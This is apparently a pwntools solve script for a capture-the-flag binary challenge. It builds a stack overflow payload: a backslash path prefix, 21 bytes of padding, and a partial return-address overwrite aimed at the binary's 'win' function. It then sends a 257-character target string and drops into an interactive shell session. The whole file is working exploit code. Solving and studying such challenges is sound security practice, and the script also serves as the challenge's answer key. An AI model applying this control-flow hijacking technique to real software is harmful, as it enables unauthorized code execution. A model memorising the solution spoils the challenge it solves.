
from pwn import *


PATH = '../challenge/handout/challenge'

#context(arch='amd64', os='linux')
elf = ELF(PATH)
context.binary = elf

# target = 'gdb'
target = 'local'
#target = 'remote'

if target == 'gdb':
    gdb_commands = ''
    # gdb_commands = 'b read_input\n' + gdb_commands
    gdb_commands += 'c\n'
    r = gdb.debug(PATH, gdbscript=gdb_commands, level='debug')

elif target == 'local':
    r = process(PATH, level='debug')

else: # target == 'remote'
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("address", default="127.0.0.1:8001",
                        nargs="?", help="Address of challenge")
    args = parser.parse_args()
    HOST, PORT = args.address.split(':')
    r = remote(HOST, int(PORT))



r.recvuntil(b'path? ')
payload = b"\\c\\..\\..\\"
# Find offset
#payload += cyclic(32)
# Offset found
rip_offset = 21
payload += b'A' * rip_offset

win = elf.symbols['win']
# Skip the initial push RBP to avoid stack being off
# by pointer size when going into syscall
win += 8
print(f'[*] Attempting RIP overwrite with 0x{win:08x}...')
win_bytes = p64(win)
end = 0
for i in range(8):
    if win_bytes[i] == 0:
        break
    end += 1

payload += win_bytes[:end]

print(f'{end=}')
print(f'Payload:\n{hexdump(payload)}')

r.sendline(payload)

r.recvuntil(b'target? ')
target = b'\\' + b't' * (260 - 3) + b'\\'
r.sendline(target)


r.interactive()

